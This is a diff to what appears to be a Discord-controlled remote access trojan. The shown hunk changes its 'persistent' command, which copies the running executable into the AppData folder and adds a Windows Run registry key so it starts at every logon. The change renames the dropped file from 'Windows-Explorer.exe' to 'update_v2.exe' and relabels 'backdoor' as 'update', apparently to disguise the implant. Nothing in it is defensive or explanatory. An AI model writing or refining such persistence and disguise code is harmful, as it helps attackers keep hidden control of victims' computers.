@@ -331,11 +331,11 @@ async def creds(context):
 @client.command(name='persistent')
 async def persistent(context):
     try:
-        backdoor_location = os.environ["appdata"] + "\\Windows-Explorer.exe"
-        if not os.path.exists(backdoor_location):
-            shutil.copyfile(sys.executable, backdoor_location)
-            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_location + '"', shell=True)
-            my_embed = discord.Embed(title=f"Persistent backdoor created on Agent#{ID}", color=0x00FF00)
+        update_location = os.environ["appdata"] + "\\update_v2.exe"
+        if not os.path.exists(update_location):
+            shutil.copyfile(sys.executable, update_location)
+            sp.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + update_location + '"', shell=True)
+            my_embed = discord.Embed(title=f"Persistent update created on Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
         else:
             my_embed = discord.Embed(title=f"Persistence already enabled on Agent#{ID}", color=0xFF0000)
